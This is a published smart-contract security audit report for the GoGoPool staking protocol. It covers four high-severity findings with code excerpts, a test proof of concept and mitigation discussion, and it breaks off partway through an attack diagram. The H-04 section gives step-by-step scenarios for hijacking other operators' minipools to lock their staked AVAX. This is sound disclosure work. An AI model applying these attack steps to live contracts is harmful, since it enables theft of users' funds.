---
sponsor: "GoGoPool"
slug: "2022-12-gogopool"
date: "2023-03-21"
title: "GoGoPool contest"
findings: "https://github.com/code-423n4/2022-12-gogopool-findings/issues"
contest: 194
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit contest outlined in this document, C4 conducted an analysis of the GoGoPool smart contract system written in Solidity. The audit contest took place between December 15—January 3 2023.

Following the C4 audit contest, 3 wardens ([hansfriese](https://twitter.com/hansfriese), RaymondFam, and [ladboy233](https://twitter.com/Xc1008Cu)) reviewed the mitigations for all identified issues; the mitigation review report is appended below the audit contest report.

## Wardens

114 Wardens contributed reports to the GoGoPool contest:

  1. [0Kage](https://twitter.com/0kage_eth)
  2. [0x73696d616f](https://twitter.com/3xJanx2009)
  3. 0xLad
  4. [0xNazgul](https://twitter.com/0xNazgul)
  5. [0xSmartContract](https://twitter.com/0xSmartContract)
  6. 0xbepresent
  7. 0xc0ffEE
  8. [0xdeadbeef0x](https://twitter.com/0xdeadbeef____)
  9. 0xhunter
  10. 0xmint
  11. [AkshaySrivastav](https://twitter.com/akshaysrivastv)
  12. [Allarious](https://twitter.com/_Allarious)
  13. Arbor-Finance (namaskar and bookland)
  14. Atarpara
  15. [Aymen0909](https://github.com/Aymen1001)
  16. Bnke0x0
  17. Breeje
  18. [Ch\_301](https://twitter.com/0xch301)
  19. [Czar102](https://twitter.com/_Czar102)
  20. [Deivitto](https://twitter.com/Deivitto)
  21. [Faith](https://twitter.com/farazsth98)
  22. [Franfran](https://franfran.dev/)
  23. HE1M
  24. HollaDieWaldfee
  25. IllIllI
  26. [Jeiwan](https://jeiwan.net)
  27. Josiah
  28. KmanOfficial
  29. Lirios
  30. [Manboy](https://twitter.com/manboy_eth)
  31. Matin
  32. NoamYakov
  33. [Nyx](https://twitter.com/Nyksx__)
  34. PaludoX0
  35. [Qeew](https://twitter.com/adigunq_adigun)
  36. RaymondFam
  37. Rolezn
  38. SEVEN
  39. Saintcode\_
  40. [SamGMK](@sam_gmk)
  41. SmartSek (0xDjango and hake)
  42. [TomJ](https://mobile.twitter.com/tomj_bb)
  43. V\_B (Barichek and vlad\_bochok)
  44. WatchDogs
  45. \_\_141345\_\_
  46. [adriro](https://github.com/romeroadrian)
  47. ak1
  48. ast3ros
  49. [aviggiano](https://twitter.com/agfviggiano)
  50. [betweenETHlines](https://twitter.com/eth_lines)
  51. [bin2chen](https://twitter.com/bin2chen)
  52. brgltd
  53. btk
  54. [c3phas](https://twitter.com/c3ph_)
  55. [camdengrieh](https://twitter.com/camdenincrypto)
  56. caventa
  57. cccz
  58. chaduke
  59. ck
  60. clems4ever
  61. [codeislight](https://twitter.com/codeIslight)
  62. cozzetti
  63. cryptonue
  64. cryptostellar5
  65. [csanuragjain](https://twitter.com/csanuragjain)
  66. [danyams](https://twitter.com/daniel_yamagata)
  67. datapunk
  68. dic0de
  69. eierina
  70. enckrish
  71. [fatherOfBlocks](https://twitter.com/father0fBl0cks)
  72. fs0c
  73. gz627
  74. [hansfriese](https://twitter.com/hansfriese)
  75. hihen
  76. imare
  77. immeas
  78. jadezti
  79. [joestakey](https://twitter.com/JoeStakey)
  80. kaliberpoziomka8552
  81. kartkhira
  82. [kiki\_dev](https://twitter.com/Kiki_developer)
  83. koxuan
  84. [ladboy233](https://twitter.com/Xc1008Cu)
  85. latt1ce
  86. lukris02
  87. mert\_eren
  88. minhtrng
  89. mookimgo
  90. [nadin](https://twitter.com/nadin20678790)
  91. nameruse
  92. neumo
  93. [nogo](https://twitter.com/0xnogo)
  94. [pauliax](https://twitter.com/SolidityDev)
  95. [peakbolt](https://twitter.com/peak_bolt)
  96. peanuts
  97. peritoflores
  98. rvierdiiev
  99. sces60107
  100. shark
  101. simon135
  102. sk8erboy
  103. slowmoses
  104. [stealthyz](https://twitter.com/Stealthyzzzz)
  105. [supernova](https://twitter.com/harshit16024263)
  106. tonisives
  107. unforgiven
  108. wagmi
  109. wallstreetvilkas
  110. yixxas
  111. yongskiws


This contest was judged by [Alex the Entreprenerd](https://twitter.com/judge).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 28 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 22 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 15 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 12 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 GoGoPool contest repository](https://github.com/code-423n4/2022-12-gogopool), and is composed of 18 smart contracts written in the Solidity programming language and includes 2,040 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (6)
## [[H-01] AVAX Assigned High Water is updated incorrectly](https://github.com/code-423n4/2022-12-gogopool-findings/issues/566)
*Submitted by [hansfriese](https://github.com/code-423n4/2022-12-gogopool-findings/issues/566), also found by [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/827), [wagmi](https://github.com/code-423n4/2022-12-gogopool-findings/issues/641), [betweenETHlines](https://github.com/code-423n4/2022-12-gogopool-findings/issues/452), [Allarious](https://github.com/code-423n4/2022-12-gogopool-findings/issues/401), [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/266), and [chaduke](https://github.com/code-423n4/2022-12-gogopool-findings/issues/193)*

[contracts/contract/MinipoolManager.sol#L374](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L374)

Node operators can manipulate the assigned high water to be higher than the actual.

### Proof of Concept

The protocol rewards node operators according to the `AVAXAssignedHighWater` that is the maximum amount assigned to the specific staker during the reward cycle.

In the function `MinipoolManager.recordStakingStart()`, the `AVAXAssignedHighWater` is updated as below.

```solidity
MinipoolManager.sol
349: 	function recordStakingStart(
350: 		address nodeID,
351: 		bytes32 txID,
352: 		uint256 startTime
353: 	) external {
354: 		int256 minipoolIndex = onlyValidMultisig(nodeID);
355: 		requireValidStateTransition(minipoolIndex, MinipoolStatus.Staking);
356: 		if (startTime > block.timestamp) {
357: 			revert InvalidStartTime();
358: 		}
359:
360: 		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Staking));
361: 		setBytes32(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".txID")), txID);
362: 		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".startTime")), startTime);
363:
364: 		// If this is the first of many cycles, set the initialStartTime
365: 		uint256 initialStartTime = getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".initialStartTime")));
366: 		if (initialStartTime == 0) {
367: 			setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".initialStartTime")), startTime);
368: 		}
369:
370: 		address owner = getAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".owner")));
371: 		uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".avaxLiquidStakerAmt")));
372: 		Staking staking = Staking(getContractAddress("Staking"));
373: 		if (staking.getAVAXAssignedHighWater(owner) < staking.getAVAXAssigned(owner)) {
374: 			staking.increaseAVAXAssignedHighWater(owner, avaxLiquidStakerAmt);//@audit wrong
375: 		}
376:
377: 		emit MinipoolStatusChanged(nodeID, MinipoolStatus.Staking);
378: 	}
```

In the line #373, if the current assigned AVAX is greater than the owner's `AVAXAssignedHighWater`, it is increased by `avaxLiquidStakerAmt`.
But this is supposed to be updated to `staking.getAVAXAssigned(owner)` rather than being increased by the amount.

Example:
The node operator creates a minipool with 1000AVAX via `createMinipool(nodeID, 2 weeks, delegationFee, 1000*1e18)`.<br>
On creation, the assigned AVAX for the operator will be 1000AVAX.<br>
If the Rialtor calls `recordStakingStart()`, `AVAXAssignedHighWater` will be updated to 1000AVAX.
After the validation finishes, the operator creates another minipool with 1500AVAX this time. Then on `recordStakingStart()`, `AVAXAssignedHighWater` will be updated to 2500AVAX by increasing 1500AVAX because the current assigned AVAX is 1500AVAX which is higher than the current `AVAXAssignedHighWater=1000AVAX`.<br>
This is wrong because the actual highest assigned amount is 1500AVAX.<br>
Note that `AVAXAssignedHighWater` is reset only through the function `calculateAndDistributeRewards` which can be called after `RewardsCycleSeconds=28 days`.

### Recommended Mitigation Steps

Call `staking.resetAVAXAssignedHighWater(owner)` instead of calling `increaseAVAXAssignedHighWater()`.

```solidity
MinipoolManager.sol
373: 		if (staking.getAVAXAssignedHighWater(owner) < staking.getAVAXAssigned(owner)) {
374: 			staking.resetAVAXAssignedHighWater(owner); //@audit update to the current AVAX assigned
375: 		}
```

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/566)**

**[Franfran (warden) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/566#issuecomment-1407447319):**
 > Can we take some extra considerations here please?<br>
> Discussed with @0xju1ie (GoGoPool) about this specific issue, and this was the answer:
> 
> (*it* is AVAXAssignedHighWater)
> 
> ``` 
> It increases on a per minipool basis right now, increasing based on only what that single minipool is getting. 
> If it was to just update the AVAXAssignedHighWater to getAVAXAssigned, then it could be assigning the highwater mark too early.
> 
> EX for how it is now:
> 1. create minipool1, assignedAvax = 1k, high water= 0
> 2. create minipool2, assignedAvax =1k, high water = 0
> 3. record start for minipool1, highwater -> 1k
> 4.  record start for minipool2, highwater -> 2k
> 
> EX for how your suggestion could be exploited:
> 1. create minipool1, assignedAvax = 1k, high water= 0
> 2. create minipool2, assignedAvax =1k, high water = 0
> 3. record start for minipool1, highwater -> 2k
> 4.  cancel minipool2, highwater -> 2k
> 
> if we used only avax assigned for that case then it would mess up the collateralization ratio for the second minipool and they would only get paid for the minipool that they are currently operating, not the one that ended previously. 
> ```

**[0xju1ie (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/566#issuecomment-1411791734):**
 > Their example in the proof of concept section is correct, and we have decided that this is not the ideal behavior and thus this is a bug. However, their recommended mitigation steps would create other issues, as highlighted by what @Franfran said. We intend to solve this issue differently than what they suggested.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/566#issuecomment-1414347752):**
 > The Warden has shown a flaw in the way `increaseAVAXAssignedHighWater` is used, which can be used to:
> - Inflate the amount of AVAX
> - With the goal of extracting more rewards than intended
> 
> I believe that the finding highlights both a way to extract further rewards as well as broken accounting.
> 
> For this reason I agree with High Severity.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > New variable to track validating avax: [multisig-labs/gogopool#25](https://github.com/multisig-labs/gogopool/pull/25)

**Status:** Mitigation confirmed with comments. Full details in [report from RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/2).



***

## [[H-02] ProtocolDAO lacks a method to take out GGP](https://github.com/code-423n4/2022-12-gogopool-findings/issues/532)
*Submitted by [bin2chen](https://github.com/code-423n4/2022-12-gogopool-findings/issues/532), also found by [AkshaySrivastav](https://github.com/code-423n4/2022-12-gogopool-findings/issues/845), [hansfriese](https://github.com/code-423n4/2022-12-gogopool-findings/issues/571), [hansfriese](https://github.com/code-423n4/2022-12-gogopool-findings/issues/567), [caventa](https://github.com/code-423n4/2022-12-gogopool-findings/issues/544), [shark](https://github.com/code-423n4/2022-12-gogopool-findings/issues/507), [RaymondFam](https://github.com/code-423n4/2022-12-gogopool-findings/issues/354), [csanuragjain](https://github.com/code-423n4/2022-12-gogopool-findings/issues/306), [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/238), and [cozzetti](https://github.com/code-423n4/2022-12-gogopool-findings/issues/178)*

[contracts/contract/Staking.sol#L379-L383](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L379-L383)

ProtocolDAO implementation does not have a method to take out  GGP. So it can't handle ggp unless it updates ProtocolDAO.

### Proof of Concept

recordStakingEnd() will pass the rewards of this reward.<br>
"If the validator is failing at their duties, their GGP will be slashed and used to compensate the loss to our Liquid Stakers"

At this point slashGGP() will be executed and the GGP will be transferred to "ProtocolDAO"

staking.slashGGP():

```solidity
    function slashGGP(address stakerAddr, uint256 ggpAmt) public onlySpecificRegisteredContract("MinipoolManager", msg.sender) {
        Vault vault = Vault(getContractAddress("Vault"));
        decreaseGGPStake(stakerAddr, ggpAmt);
        vault.transferToken("ProtocolDAO", ggp, ggpAmt);
    }
```

But the current ProtocolDAO implementation does not have a method to take out  GGP. So it can't handle ggp unless it updates ProtocolDAO

### Recommended Mitigation Steps

1.transfer GGP to  ClaimProtocolDAO<br>
or<br>
2.Similar to ClaimProtocolDAO, add spend method to retrieve GGP

```solidity
contract ProtocolDAO is Base {
...

+    function spend(
+        address recipientAddress,
+        uint256 amount
+    ) external onlyGuardian {
+        Vault vault = Vault(getContractAddress("Vault"));
+        TokenGGP ggpToken = TokenGGP(getContractAddress("TokenGGP"));
+
+        if (amount == 0 || amount > vault.balanceOfToken("ProtocolDAO", ggpToken)) {
+            revert InvalidAmount();
+        }
+
+        vault.withdrawToken(recipientAddress, ggpToken, amount);
+
+        emit GGPTokensSentByDAOProtocol(address(this), recipientAddress, amount);
+   }
```

**[Alex the Entreprenerd (judge) increased severity to High and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/532#issuecomment-1414367063):**
 > The Warden has shown how, due to a lack of `sweep` the default contract for fee handling will be unable to retrieve tokens sent to it.
> 
> While the issue definitely would have been discovered fairly early in Prod, the in-scope system makes it clear that the funds would have been sent to ProtocolDAO.sol and would have been lost indefinitely.
> 
> For this reason, I believe the finding to be of High Severity.

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/532#issuecomment-1421419694):**
 > Acknowledged.
> 
> Thanks for the report. This is something we're aware of and are not going to fix at the moment.
> 
> The funds are transferred to the Vault and the ProtocolDAO contract is upgradeable. Therefore in the future we can upgrade the contract to spend the Vault GGP tokens to return funds to Liquid Stakers.
> 
> We expect slashing to be a rare event and might have some manual steps involved in the early days of the protocol to do this process if it occurs.



***

## [[H-03] Node operator is getting slashed for full duration even though rewards are distributed based on a 14 day cycle](https://github.com/code-423n4/2022-12-gogopool-findings/issues/493)
*Submitted by [immeas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/493), also found by [Allarious](undefined), [ast3ros](undefined), [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/881), [Josiah](https://github.com/code-423n4/2022-12-gogopool-findings/issues/794), [SmartSek](https://github.com/code-423n4/2022-12-gogopool-findings/issues/592), [Franfran](https://github.com/code-423n4/2022-12-gogopool-findings/issues/490), [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/344), [RaymondFam](https://github.com/code-423n4/2022-12-gogopool-findings/issues/322), and [0xdeadbeef0x](https://github.com/code-423n4/2022-12-gogopool-findings/issues/216)*

[contracts/contract/MinipoolManager.sol#L673-L675](https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L673-L675)

A node operator sends in the amount of duration they want to stake for. Behind the scenes Rialto will stake in 14 day cycles and then distribute rewards.

If a node operator doesn't have high enough availability and doesn't get any rewards, the protocol will slash their staked `GGP`. For calculating the expected rewards that are missed however, the full duration is used:

```javascript
File: MinipoolManager.sol

557:	function getExpectedAVAXRewardsAmt(uint256 duration, uint256 avaxAmt) public view returns (uint256) {
558:		ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
559:		uint256 rate = dao.getExpectedAVAXRewardsRate();
560:		return (avaxAmt.mulWadDown(rate) * duration) / 365 days; // full duration used when calculating expected reward
561:	}

...

670:	function slash(int256 index) private {

...

673:		uint256 duration = getUint(keccak256(abi.encodePacked("minipool.item", index, ".duration")));
674:		uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt")));
675:		uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt); // full duration
676:		uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);
```

This is unfair to the node operator because the expected rewards is from a 14 day cycle.

Also, If they were to be unavailable again, in a later cycle, they would get slashed for the full duration once again.

### Impact

A node operator staking for a long time is getting slashed for an unfairly large amount if they aren't available during a 14 day period.

The protocol also wants node operators to stake in longer periods: <https://multisiglabs.notion.site/Known-Issues-42e2f733daf24893a93ad31100f4cd98>

> Team Comment:<br>
> *   This can only be taken advantage of when signing up for 2-4 week validation periods. **Our protocol is incentivizing nodes to sign up for 3-12 month validation periods.** If the team notices this mechanic being abused, Rialto may update its GGP reward calculation to disincentive this behavior.

This slashing amount calculation incentives the node operator to sign up for the shortest period possible and restake themselves to minimize possible losses.

### Proof of Concept

Test in `MinipoolManager.t.sol`:

```javascript
	function testRecordStakingEndWithSlashHighDuration() public {
		uint256 duration = 365 days;
		uint256 depositAmt = 1000 ether;
		uint256 avaxAssignmentRequest = 1000 ether;
		uint256 validationAmt = depositAmt + avaxAssignmentRequest;
		uint128 ggpStakeAmt = 200 ether;

		vm.startPrank(nodeOp);
		ggp.approve(address(staking), MAX_AMT);
		staking.stakeGGP(ggpStakeAmt);
		MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
		vm.stopPrank();

		address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
		vm.prank(liqStaker1);
		ggAVAX.depositAVAX{value: MAX_AMT}();

		vm.prank(address(rialto));
		minipoolMgr.claimAndInitiateStaking(mp1.nodeID);

		bytes32 txID = keccak256("txid");
		vm.prank(address(rialto));
		minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

		skip(2 weeks); // a two week cycle
		
		vm.prank(address(rialto));
		minipoolMgr.recordStakingEnd{value: validationAmt}(mp1.nodeID, block.timestamp, 0 ether);

		assertEq(vault.balanceOf("MinipoolManager"), depositAmt);

		int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);
		MinipoolManager.Minipool memory mp1Updated = minipoolMgr.getMinipool(minipoolIndex);
		assertEq(mp1Updated.status, uint256(MinipoolStatus.Withdrawable));
		assertEq(mp1Updated.avaxTotalRewardAmt, 0);
		assertTrue(mp1Updated.endTime != 0);

		assertEq(mp1Updated.avaxNodeOpRewardAmt, 0);
		assertEq(mp1Updated.avaxLiquidStakerRewardAmt, 0);

		assertEq(minipoolMgr.getTotalAVAXLiquidStakerAmt(), 0);

		assertEq(staking.getAVAXAssigned(mp1Updated.owner), 0);
		assertEq(staking.getMinipoolCount(mp1Updated.owner), 0);

		// log slash amount
		console.log("slashedAmount",mp1Updated.ggpSlashAmt);
	}
```

Slashed amount for a `365 days` duration is `100 eth` (10%). However, where they to stake for the minimum time, `14 days` the slashed amount would be only \~`3.8 eth`.

### Tools Used

vs code, forge

### Recommended Mitigation Steps

Either hard code the duration to 14 days for calculating expected rewards or calculate the actual duration using `startTime` and `endTime`.

**[0xju1ie (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/493#event-8306021419)**

**[Alex the Entreprenerd (judge) increased severity to High and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/493#issuecomment-1413687136):**
 > The Warden has shown an incorrect formula that uses the `duration` of the pool for slashing.
> 
> The resulting loss can be up to 26 times the yield that should be made up for.
> 
> Because the:
> - Math is incorrect
> - Based on intended usage
> - Impact is more than an order of magnitude off
> - Principal is impacted (not just loss of yield)
> 
> I believe the most appropriate severity to be High.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Base slash on validation period not full duration: [multisig-labs/gogopool#41](https://github.com/multisig-labs/gogopool/pull/41)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/3) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/22).



***

## [[H-04] Hijacking of node operators minipool causes loss of staked funds](https://github.com/code-423n4/2022-12-gogopool-findings/issues/213)
*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-12-gogopool-findings/issues/213), also found by [bin2chen](undefined), [datapunk](https://github.com/code-423n4/2022-12-gogopool-findings/issues/879), [0xmint](https://github.com/code-423n4/2022-12-gogopool-findings/issues/805), [Lirios](https://github.com/code-423n4/2022-12-gogopool-findings/issues/792), [AkshaySrivastav](https://github.com/code-423n4/2022-12-gogopool-findings/issues/772), [adriro](https://github.com/code-423n4/2022-12-gogopool-findings/issues/752), [ak1](https://github.com/code-423n4/2022-12-gogopool-findings/issues/751), [IllIllI](https://github.com/code-423n4/2022-12-gogopool-findings/issues/738), [pauliax](https://github.com/code-423n4/2022-12-gogopool-findings/issues/726), [imare](https://github.com/code-423n4/2022-12-gogopool-findings/issues/703), [imare](https://github.com/code-423n4/2022-12-gogopool-findings/issues/699), [immeas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/692), [sces60107](https://github.com/code-423n4/2022-12-gogopool-findings/issues/679), [peritoflores](https://github.com/code-423n4/2022-12-gogopool-findings/issues/671), [wagmi](https://github.com/code-423n4/2022-12-gogopool-findings/issues/640), [Jeiwan](https://github.com/code-423n4/2022-12-gogopool-findings/issues/617), [sk8erboy](https://github.com/code-423n4/2022-12-gogopool-findings/issues/602), [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/568), [caventa](https://github.com/code-423n4/2022-12-gogopool-findings/issues/524), [yixxas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/500), [Franfran](https://github.com/code-423n4/2022-12-gogopool-findings/issues/485), [clems4ever](https://github.com/code-423n4/2022-12-gogopool-findings/issues/482), [Ch\_301](https://github.com/code-423n4/2022-12-gogopool-findings/issues/425), [Allarious](https://github.com/code-423n4/2022-12-gogopool-findings/issues/396), [0xc0ffEE](https://github.com/code-423n4/2022-12-gogopool-findings/issues/355), [0Kage](https://github.com/code-423n4/2022-12-gogopool-findings/issues/303), [kaliberpoziomka8552](https://github.com/code-423n4/2022-12-gogopool-findings/issues/263), [kaliberpoziomka8552](https://github.com/code-423n4/2022-12-gogopool-findings/issues/257), [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/255), [wallstreetvilkas](https://github.com/code-423n4/2022-12-gogopool-findings/issues/199), [stealthyz](https://github.com/code-423n4/2022-12-gogopool-findings/issues/196), [cozzetti](https://github.com/code-423n4/2022-12-gogopool-findings/issues/181), [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/173), [ladboy233](https://github.com/code-423n4/2022-12-gogopool-findings/issues/123), [chaduke](https://github.com/code-423n4/2022-12-gogopool-findings/issues/83), [chaduke](https://github.com/code-423n4/2022-12-gogopool-findings/issues/81), and [Manboy](https://github.com/code-423n4/2022-12-gogopool-findings/issues/76)*

A malicious actor can hijack a minipool of any node operator that finished the validation period or had an error.

The impacts:

1.  Node operators staked funds will be lost (Loss of funds)
2.  Hacker can hijack the minipool and retrieve rewards without hosting a node. (Theft of yield)

2.1 See scenario \#2 comment for dependencies

### Proof of Concept

**Background description**

The protocol created a state machine that validates transitions between minipool states. For this exploit it is important to understand three states:

1.  `Prelaunch` - This state is the initial state when a minipool is created. The created minipool will have a status of `Prelaunch` until liquid stakers funds are matched and `rialto` stakes 2000 AVAX into Avalanche.
2.  `Withdrawable` - This state is set when the 14 days validation period is over. In this state:<br>
  2.1. `rialto` returned 1000 AVAX to the liquid stakers and handled reward distribution.<br>
  2.2. Node operators can withdraw their staked funds and rewards.<br>
  2.3. If the node operator signed up for a duration longer than 14 days `rialto` will recreate the minipool and stake it for another 14 days.<br>
3. `Error` - This state is set when `rialto` has an issue to stake the funds in Avalanche

The state machine allows transitions according the `requireValidStateTransition` function:
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L164>

        function requireValidStateTransition(int256 minipoolIndex, MinipoolStatus to) private view {
    ------
            } else if (currentStatus == MinipoolStatus.Withdrawable || currentStatus == MinipoolStatus.Error) {
    		isValid = (to == MinipoolStatus.Finished || to == MinipoolStatus.Prelaunch);
    	} else if (currentStatus == MinipoolStatus.Finished || currentStatus == MinipoolStatus.Canceled) {
    		// Once a node is finished/canceled, if they re-validate they go back to beginning state
    		isValid = (to == MinipoolStatus.Prelaunch);
    ------

In the above restrictions, we can see that the following transitions are allowed:

1.  From `Withdrawable` state to `Prelaunch` state. This transition enables `rialto` to call `recreateMinipool`
2.  From `Finished` state to `Prelaunch` state. This transition allows a node operator to re-use their nodeID to stake again in the protocol.
3.  From `Error` state to `Prelaunch` state. This transition allows a node operator to re-use their nodeID to stake again in the protocol after an error.

\#2 is a needed capability, therefore `createMinipool` allows overriding a minipool record if:
`nodeID` already exists and transition to `Prelaunch` is permitted

`createMinipool`: <br><https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L242>

```
	function createMinipool(
		address nodeID,
		uint256 duration,
		uint256 delegationFee,
		uint256 avaxAssignmentRequest
	) external payable whenNotPaused {
---------
		// Create or update a minipool record for nodeID
		// If nodeID exists, only allow overwriting if node is finished or canceled
		// 		(completed its validation period and all rewards paid and processing is complete)
		int256 minipoolIndex = getIndexOf(nodeID);
		if (minipoolIndex != -1) {
			requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);
			resetMinipoolData(minipoolIndex);
----------
		setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));
----------
		setAddress(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".owner")), msg.sender);
----------
	}

```

THE BUG: `createMinipool` can be called by **Anyone** with the `nodeID` of any node operator.

If `createMinipool` is called at the `Withdrawable` state or `Error` state:

*   The transaction will be allowed
*   The owner of the minipool will be switched to the caller.

Therefore, the minipool is hijacked and the node operator will not be able to withdraw their funds.

**Exploit scenarios**

As shown above, an attacker can **always** hijack the minipool and lock the node operators funds.

1.  Cancel the minipool
2.  Earn rewards on behalf of original NodeOp

***Scenario #1 - Cancel the minipool***

A hacker can hijack the minipool and immediately cancel the pool after a 14 day period is finished or an error state.
Results:

1.  Node operator will lose all his staked AVAX<br>
  1.1. This can be done by a malicious actor to **ALL** GoGoPool stakers to lose their funds in a period of 14 days.<br>
2. Hacker will not lose anything and not gain anything.

Consider the following steps:

1.  Hacker creates a node and creates a minipool `node-1337`.
2.  NodeOp registers a nodeID `node-123` and finished the 14 days stake period. State is `Withdrawable`.
3.  Hacker calls `createMinipool` with `node-123` and deposits 1000 AVAX. Hacker is now owner of the minipool
4.  Hacker calls `cancelMinipool` of `node-123`  and receives his staked 1000 AVAX.
5.  NodeOp cannot withdraw his staked AVAX as NodeOp is no longer the owner.
6.  Hacker can withdraw staked AVAX for both `node-1337` and `node-123`

The above step #1 is **not** necessary but allow the hacker to immediately cancel the minipool without waiting 5 days.<br>
(See other submitted bug #211: "Anti griefing mechanism can be bypassed")

           ┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐
           │           │               │           │            │           │              │           │
           │   Rialto  │               │  NodeOp   │            │  Minipool │              │ Hacker    │
           │           │               │           │            │  Manager  │              │           │
           └─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘
                 │claimAndInitiate(Node-1337)│                        │createMinipool(Node-1337) │
                 │recordStakingStart(...)    │                        │◄─────────────────────────┤ ┌────────────┐
                 ├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  │
                 │                           │                        │                          │ │ 100 GPP    │
                 │                           │createMinipool(Node-123)│                          │ └────────────┘
                 │claimAndInitiate(Node-123) ├───────────────────────►│                          │
                 │recordStakingStart(...)    │                        │                          │
                 ├───────────────────────────┼───────────────────────►│                          │
    ┌──────────┐ │                           │                        │                          │
    │14 days   │ │recordStakingEnd(Node-1337)│                        │                          │
    └──────────┘ │recordStakingEnd(Node-123) │//STATE: WITHDRAWABLE// │                          │ ┌────────────┐
                 ├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  │
                 │                           │                        │createMinipool(Node-123)  │ │Hacker=Owner│
                 │                           │                        │◄─────────────────────────┤ └────────────┘
                 │                           │withdrawMinipoolF..(123)│                          │
                 │                           ├───────────────────────►│cancleMinipool(Node-123)  │
                 │                           │       REVERT!          │◄─────────────────────────┤
                 │                           │◄───────────────────────┤      1000 AVAX           │
                 │                           │                        ├─────────────────────────►│
                 │                           │   ┌────────────────┐   │withdrawMinipoolFunds(1337│ ┌──────────┐
                 │                           │   │  NodeOp loses  │   │◄─────────────────────────┤ │Withdraw  │
                 │                           │   │  his 1000 AVAX │   │      1000 AVAX + REWARDS │ │stake and │
                 │                           │   │  Stake, cannot │   ├─────────────────────────►│ │rewards   │
                 │                           │   │  withdraw      │   │                          │ └──────────┘
                 │                           │   └────────────────┘   │     ┌───────────────┐    │
